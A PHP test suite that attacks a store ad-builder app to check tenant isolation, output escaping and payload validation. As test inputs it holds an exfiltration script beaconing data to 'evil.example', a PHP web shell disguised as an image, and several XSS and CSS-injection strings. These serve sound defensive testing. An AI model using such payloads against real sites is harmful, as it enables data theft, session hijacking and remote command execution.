<?php

use App\Models\BuilderAd;
use App\Models\BuilderAsset;
use App\Models\BuilderFont;
use App\Models\Media;
use App\Models\Store;
use App\Services\AdCompiler;
use Illuminate\Support\Facades\Storage;

/*
|--------------------------------------------------------------------------
| Going after the Ad Builder
|--------------------------------------------------------------------------
|
| The builder is the one place in the app where what a person writes becomes a PAGE — and that page
| runs on a television in a shop, with scripts in it. So the attacks here are the ones that matter for a
| page: getting a tag, a script or another shop's file into it; and the ones that matter for a design
| tool: reaching another store's work by its id, and payloads shaped to make the server fall over.
|
*/

beforeEach(function () {
    Storage::fake('public');

    $this->store = Store::factory()->create(['name' => 'Alpha Mart']);
    $this->other = Store::factory()->create(['name' => 'Beta Deli']);
    $this->designer = createStoreUser($this->store, ['ad-view', 'ad-store', 'ad-update', 'ad-destroy'], 'Designer');

    $this->actingAs($this->designer)->withSession(['current_store_id' => $this->store->id]);
});

/** A small, valid document holding the given elements and background layers. */
function attackDocument(array $elements = [], array $layers = []): array
{
    $document = BuilderAd::blankDocument();
    $document['elements'] = $elements;
    $document['stage']['background']['layers'] = $layers;

    return $document;
}

/* ── The store wall ──────────────────────────────────────────────────── */

test('another store’s ad cannot be changed, copied, published or deleted by its id', function () {
    $theirs = BuilderAd::factory()->withText('Their sale')->create(['store_id' => $this->other->id, 'name' => 'Theirs']);
    $before = $theirs->document;

    $this->putJson("/builder/{$theirs->id}", ['name' => 'Mine now', 'document' => attackDocument()])->assertNotFound();
    $this->postJson("/builder/{$theirs->id}/duplicate")->assertNotFound();
    $this->postJson("/builder/{$theirs->id}/publish")->assertNotFound();
    $this->postJson("/builder/{$theirs->id}/in-playlists", ['in_playlists' => true])->assertNotFound();
    $this->deleteJson("/builder/{$theirs->id}", ['password' => 'password'])->assertNotFound();
    $this->get("/builder/{$theirs->id}")->assertNotFound();

    expect($theirs->fresh()->name)->toBe('Theirs')
        ->and($theirs->fresh()->document)->toEqual($before)
        ->and(BuilderAd::count())->toBe(1)
        ->and(Media::count())->toBe(0);
});

test('an ad cannot be moved into another store by saying so in the payload', function () {
    $mine = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);

    $this->putJson("/builder/{$mine->id}", [
        'name' => 'Moved?', 'document' => attackDocument(), 'store_id' => $this->other->id, 'media_id' => 1, 'published_at' => now(),
    ])->assertOk();

    expect($mine->fresh()->store_id)->toBe($this->store->id)
        ->and($mine->fresh()->media_id)->toBeNull()
        ->and($mine->fresh()->published_at)->toBeNull();

    // A new one lands in the store the person works in, whatever it claims.
    $id = $this->postJson('/builder', ['name' => 'New', 'document' => attackDocument(), 'store_id' => $this->other->id])
        ->assertOk()->json('ad.id');

    expect(BuilderAd::find($id)->store_id)->toBe($this->store->id);
});

test('another store’s pictures and videos never reach this store’s page — in an element or in the background', function () {
    $picture = BuilderAsset::factory()->create(['store_id' => $this->other->id, 'path' => 'builder/2/assets/secret-photo.jpg']);
    $clip = BuilderAsset::factory()->video()->create(['store_id' => $this->other->id, 'path' => 'builder/2/assets/secret-clip.mp4']);

    $document = attackDocument([
        ['id' => 'a', 'type' => 'image', 'x' => 0, 'y' => 0, 'w' => 100, 'h' => 100, 'z' => 0, 'assetId' => $picture->id],
        ['id' => 'b', 'type' => 'video', 'x' => 0, 'y' => 0, 'w' => 100, 'h' => 100, 'z' => 1, 'assetId' => $clip->id],
    ], [
        ['id' => 'l1', 'type' => 'image', 'assetId' => $picture->id],
        ['id' => 'l2', 'type' => 'video', 'assetId' => $clip->id],
    ]);

    $id = $this->postJson('/builder', ['name' => 'Borrowed', 'document' => $document])->assertOk()->json('ad.id');
    $this->postJson("/builder/{$id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    expect($html)->not->toContain('secret-photo')->not->toContain('secret-clip');
});

test('another store’s asset cannot be deleted by its id, and the shelf lists this store’s alone', function () {
    $theirs = BuilderAsset::factory()->create(['store_id' => $this->other->id, 'title' => 'Their logo']);
    BuilderAsset::factory()->create(['store_id' => $this->store->id, 'title' => 'Our logo']);

    $this->deleteJson("/builder/assets/{$theirs->id}")->assertNotFound();

    expect(BuilderAsset::find($theirs->id))->not->toBeNull();

    $titles = collect($this->getJson('/builder/assets/data')->assertOk()->json('assets'))->pluck('title');

    expect($titles->all())->toBe(['Our logo']);
});

test('naming another shop in the listings’ filter finds nothing of it', function () {
    BuilderAd::factory()->create(['store_id' => $this->other->id, 'name' => 'Their ad']);
    BuilderAsset::factory()->create(['store_id' => $this->other->id, 'title' => 'Their logo']);

    expect($this->getJson("/builder/data?store_id={$this->other->id}")->assertOk()->json('ads'))->toBe([])
        ->and($this->getJson("/builder/assets/data?store_id={$this->other->id}")->assertOk()->json('assets'))->toBe([])
        ->and($this->getJson('/builder/data?store_id=0')->status())->toBe(422);
});

/* ── Getting code into the page ──────────────────────────────────────── */

test('the draft preview runs sandboxed, so whatever it carried could reach nothing of the app', function () {
    $document = attackDocument([[
        'id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 400, 'h' => 100, 'z' => 0,
        'text' => '<script>fetch("/builder/data").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script>',
    ]]);
    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);

    $response = $this->get("/builder/{$ad->id}/preview")->assertOk();

    // An opaque origin: no cookies, no session, no same-origin requests with them — and no tag to run.
    expect($response->headers->get('Content-Security-Policy'))->toBe('sandbox allow-scripts')
        ->and($response->getContent())->not->toContain('<script>fetch')
        ->toContain('&lt;script&gt;fetch');
});

test('a poster that is not a picture is never written, whatever label it wears', function () {
    $mine = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);

    foreach ([
        'data:image/jpeg;base64,'.base64_encode('<?php echo shell_exec($_GET["c"]); ?>'),
        'data:image/png;base64,'.base64_encode("\x89PNG\r\n\x1a\n<script>alert(1)</script>"),
        'data:image/svg+xml;base64,'.base64_encode('<svg onload="alert(1)"/>'),
        'data:text/html;base64,'.base64_encode('<script>alert(1)</script>'),
    ] as $thumbnail) {
        $status = $this->putJson("/builder/{$mine->id}", ['name' => 'Poster', 'document' => attackDocument(), 'thumbnail' => $thumbnail])->status();

        expect($status)->toBeIn([200, 422]);
    }

    expect($mine->fresh()->thumbnail_path)->toBeNull()
        ->and(Storage::disk('public')->allFiles())->toBe([]);
});

test('the animations cannot close their script tag, whatever the ids, effects and eases say', function () {
    $closer = '</script><script>alert(document.cookie)</script>';

    $document = attackDocument([[
        'id' => 'x'.$closer, 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 400, 'h' => 100, 'z' => 0, 'text' => $closer,
        'style' => ['fontFamily' => $closer],
        'animations' => [
            'in' => ['effect' => 'fade', 'ease' => 'cubic('.$closer.')', 'direction' => $closer],
            'loop' => ['effect' => $closer],
            'out' => ['effect' => 'fade', 'at' => $closer],
        ],
    ]]);

    // Straight into the database — past the save rules, as a row written some other way would be.
    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    // The script tags in the page are exactly the ones the compiler writes: the stage scaler, the data
    // block, the motion files and the boot script.
    $written = 3 + count(AdCompiler::MOTION_SCRIPTS);

    expect(substr_count($html, '<script'))->toBe($written)
        ->and(substr_count($html, '</script>'))->toBe($written)
        ->and($html)->not->toContain('<script>alert')
        ->not->toContain('alert(document.cookie)</script>');

    // And the data block still parses — into nothing but values the compiler wrote itself.
    preg_match('/<script type="application\/json" id="ad-animations">(.*?)<\/script>/s', $html, $match);
    $config = json_decode($match[1], true);

    expect($config)->toBe(['xscriptscriptalertdocumentcookiescript' => [
        'in' => [
            'effect' => 'fade', 'direction' => 'up', 'distance' => 80, 'scale' => 0.6, 'degrees' => -90, 'blur' => 20,
            'duration' => 0.8, 'delay' => 0, 'ease' => 'power2.out',
        ],
        'out' => [
            'effect' => 'fade', 'direction' => 'up', 'distance' => 80, 'scale' => 0.6, 'degrees' => -90, 'blur' => 20,
            'at' => 5, 'duration' => 0.6, 'ease' => 'power2.in',
        ],
    ]]);
});

test('an ad’s name and words stay words — on the page and in the editor', function () {
    $name = '</title><script>alert(1)</script>';
    $words = '"\'><img src=x onerror=alert(1)>';

    $document = attackDocument([[
        'id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 400, 'h' => 100, 'z' => 0, 'text' => $words, 'style' => [],
        'animations' => ['in' => ['effect' => 'fade']],
    ]]);

    $id = $this->postJson('/builder', ['name' => $name, 'document' => $document])->assertOk()->json('ad.id');
    $this->postJson("/builder/{$id}/publish")->assertOk();

    $page = Storage::disk('public')->get(Media::sole()->path);

    expect($page)->toContain('&lt;/title&gt;&lt;script&gt;')
        ->not->toContain('<img src=x')
        ->not->toContain('<script>alert(1)');

    // The editor carries the same design inside an attribute, where one raw quote would end it.
    $editor = $this->get("/builder/{$id}")->assertOk()->getContent();

    expect($editor)->not->toContain('<img src=x')
        ->not->toContain('<script>alert(1)')
        ->not->toContain('onerror=alert(1)>');
});

test('a colour, a gradient or a font name cannot carry a second declaration into the stylesheet', function () {
    $escape = 'red;} body{background:url(https://evil.example/x.png)} .x{';

    $document = attackDocument([[
        'id' => 'a', 'type' => 'shape', 'x' => 0, 'y' => 0, 'w' => 100, 'h' => 100, 'z' => 0,
        'style' => [
            'fill' => $escape, 'blend' => $escape,
            'gradient' => ['kind' => $escape, 'angle' => $escape, 'stops' => [['color' => $escape, 'at' => 0], ['color' => '#000000', 'at' => $escape]]],
            'border' => ['width' => 4, 'style' => $escape, 'color' => '#ffffff'],
            'shadow' => ['x' => $escape, 'y' => 0, 'blur' => 0, 'spread' => 0, 'color' => '#000000'],
        ],
    ]], [
        ['id' => 'l', 'type' => 'color', 'color' => $escape, 'opacity' => $escape, 'blend' => $escape],
    ]);

    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    expect($html)->not->toContain('evil.example')->not->toContain('red;}')->not->toContain('.x{');
});

test('a font’s stylesheet can bring nothing but its own family’s files into a page', function () {
    // The fonts travel inside the page. A stylesheet pointing at any other file on the disk gets nothing
    // in: only a file the family's own row lists is ever read, whatever the stylesheet says.
    Storage::disk('public')->put('media/2/private.woff2', 'another-shops-bytes');
    Storage::disk('public')->put('fonts/anton/font.css', "@font-face{font-family:'Anton';font-style:normal;font-weight:400;src:url('http://localhost/storage/media/2/private.woff2') format('woff2');}");
    BuilderFont::create([
        'family' => 'Anton', 'slug' => 'anton', 'kind' => 'display', 'weights' => [400],
        'files' => ['fonts/anton/400-normal-0.woff2'], 'css_path' => 'fonts/anton/font.css', 'size' => 1,
    ]);

    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => attackDocument([[
        'id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 900, 'h' => 200, 'z' => 0,
        'text' => 'Sale', 'style' => ['fontFamily' => 'Anton'], 'animations' => [],
    ]])]);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    expect($html)->not->toContain('@font-face')->not->toContain(base64_encode('another-shops-bytes'));
});

/* ── Payloads shaped to make it fall over ────────────────────────────── */

test('a document of the wrong shape is refused with a 422, never a 500', function (array $payload) {
    $this->postJson('/builder', ['name' => 'Odd', ...$payload])->assertStatus(422);
})->with([
    'a document that is a string' => [['document' => 'a design']],
    'elements that are a string' => [['document' => [...attackDocument(), 'elements' => 'none']]],
    'a style that is a string' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'style' => 'color:red']])]],
    'a slot that is a string' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'animations' => ['in' => 'fade']]])]],
    'an ease that is a list' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'animations' => ['in' => ['effect' => 'fade', 'ease' => ['power2.out']]]]])]],
    'a filter that is a list' => [['document' => attackDocument([['id' => 'a', 'type' => 'image', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'style' => ['filters' => ['blur' => [1, 2]]]]])]],
    'a number far past any limit' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => '1e400', 'y' => 0, 'w' => 1, 'h' => 1]])]],
    'a layer with no kind' => [['document' => attackDocument([], [['id' => 'l']])]],
    'a layer that is a string' => [['document' => attackDocument([], ['color'])]],
    'too many layers' => [['document' => attackDocument([], array_fill(0, 13, ['id' => 'l', 'type' => 'color']))]],
    'a stage of another size' => [['document' => [...attackDocument(), 'stage' => ['width' => 3840, 'height' => 2160, 'background' => ['layers' => []]]]]],
    'a line style that is a list' => [['document' => attackDocument([['id' => 'a', 'type' => 'shape', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'style' => ['shape' => 'line', 'lineStyle' => ['dashed']]]])]],
    'a line style nobody offers' => [['document' => attackDocument([['id' => 'a', 'type' => 'shape', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'style' => ['shape' => 'line', 'lineStyle' => 'wavy']]])]],
    'a parent that is a list' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => ['g']]])]],
    'a parent that is a number' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 7]])]],
    // The element's own parent is a real group; the GROUP's parent is a list — read on the climb up.
    'a parent whose own parent is a list' => [['document' => attackDocument([
        ['id' => 'b', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 10, 'h' => 10, 'parentId' => 'g1'],
        ['id' => 'g1', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 10, 'h' => 10, 'parentId' => ['x']],
    ])]],
    'a parent whose own parent is a number' => [['document' => attackDocument([
        ['id' => 'b', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 10, 'h' => 10, 'parentId' => 'g1'],
        ['id' => 'g1', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 10, 'h' => 10, 'parentId' => 12],
    ])]],
    // A circle (g in h, h in g) that a second "g" hides from the climb, which knows one parent per id.
    'two elements with one id' => [['document' => attackDocument([
        ['id' => 'x', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1],
        ['id' => 'g', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'h'],
        ['id' => 'h', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g'],
        ['id' => 'g', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'x'],
    ])]],
    'a parent that is nowhere' => [['document' => attackDocument([['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'ghost']])]],
    'an element inside itself' => [['document' => attackDocument([['id' => 'g', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g']])]],
    'groups in a circle' => [['document' => attackDocument([
        ['id' => 'g1', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g2'],
        ['id' => 'g2', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g1'],
    ])]],
    'a group whose parent is a text' => [['document' => attackDocument([
        ['id' => 't', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1],
        ['id' => 'g', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 't'],
    ])]],
    'an element whose parent has no type at all' => [['document' => attackDocument([
        ['id' => 'x', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1],
        ['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'x'],
    ])]],
    'an element that is a string beside a parent' => [['document' => attackDocument([
        'not an element',
        ['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g'],
    ])]],
    'four groups deep' => [['document' => attackDocument([
        ['id' => 'g1', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1],
        ['id' => 'g2', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g1'],
        ['id' => 'g3', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g2'],
        ['id' => 'g4', 'type' => 'group', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g3'],
        ['id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 1, 'h' => 1, 'parentId' => 'g4'],
    ])]],
    'a portrait stage on an ad that did not say so' => [['document' => BuilderAd::blankDocument('portrait')]],
    'a landscape stage on an ad that said portrait' => [['orientation' => 'portrait', 'document' => attackDocument()]],
    'an orientation that is a list' => [['orientation' => ['portrait'], 'document' => attackDocument()]],
    'an orientation nobody offers' => [['orientation' => 'square', 'document' => attackDocument()]],
]);

/* ── The orientation is fixed ────────────────────────────────────────── */

test('a saved ad’s orientation cannot be changed by any payload — the design is measured against the column', function () {
    $landscape = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);
    $portrait = BuilderAd::factory()->portrait()->withText()->create(['store_id' => $this->store->id]);

    // Saying it, with a design of the other shape: refused on the stage's size.
    $this->putJson("/builder/{$landscape->id}", ['name' => 'Turned', 'orientation' => 'portrait', 'document' => BuilderAd::blankDocument('portrait')])
        ->assertStatus(422)->assertJsonValidationErrors(['document.stage.width', 'document.stage.height']);

    $this->putJson("/builder/{$portrait->id}", ['name' => 'Turned', 'orientation' => 'landscape', 'document' => BuilderAd::blankDocument()])
        ->assertStatus(422)->assertJsonValidationErrors(['document.stage.width', 'document.stage.height']);

    // Saying it with a design of the ad's own shape: saved, and the word is simply not read.
    $this->putJson("/builder/{$landscape->id}", ['name' => 'Turned', 'orientation' => 'portrait', 'document' => BuilderAd::blankDocument()])
        ->assertOk();
    $this->putJson("/builder/{$portrait->id}", ['name' => 'Turned', 'orientation' => 'landscape', 'document' => BuilderAd::blankDocument('portrait')])
        ->assertOk();

    // A shape that is not a word is a malformed payload, refused like any other — never a 500.
    $this->putJson("/builder/{$portrait->id}", ['name' => 'Turned', 'orientation' => ['landscape'], 'document' => BuilderAd::blankDocument('portrait')])
        ->assertStatus(422)->assertJsonValidationErrors('orientation');

    expect($landscape->fresh()->orientation)->toBe('landscape')
        ->and($portrait->fresh()->orientation)->toBe('portrait');
});
